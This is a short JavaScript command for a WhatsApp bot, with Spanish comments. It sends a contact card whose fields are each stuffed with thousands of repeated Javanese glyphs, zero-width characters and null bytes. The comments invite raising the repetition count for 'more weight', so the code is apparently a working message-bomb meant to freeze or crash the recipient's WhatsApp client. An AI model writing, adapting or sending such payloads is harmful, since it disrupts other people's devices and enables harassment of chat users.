let handler = async (m, { conn }) => {
  const number = '521234567890'; // Número del contacto (puede ser real o falso)

  // Caracteres invisibles
  const invisible = '\u200B\u2060\u0000'; // Puedes repetir más si quieres
  const basura = 'ꦾ' + invisible;
  const relleno = basura.repeat(4000); // Puedes subir este número para más peso

  const vcard = `
BEGIN:VCARD
VERSION:3.0
FN:${relleno}
ORG:${relleno}
TITLE:${relleno}
EMAIL;type=INTERNET:${relleno}@example.com
NOTE:${relleno}
ADR:;;${relleno};Ciudad;Estado;00000;Planeta Tierra
TEL;type=CELL;type=VOICE;waid=${number}:${number}
END:VCARD
  `.trim();

  await conn.sendMessage(m.chat, {
    contacts: {
      displayName: basura.repeat(3), // Nombre que se ve en la burbuja
      contacts: [{ vcard }]
    }
  }, { quoted: m });
};

handler.command = /^contacto$/i;
export default handler;
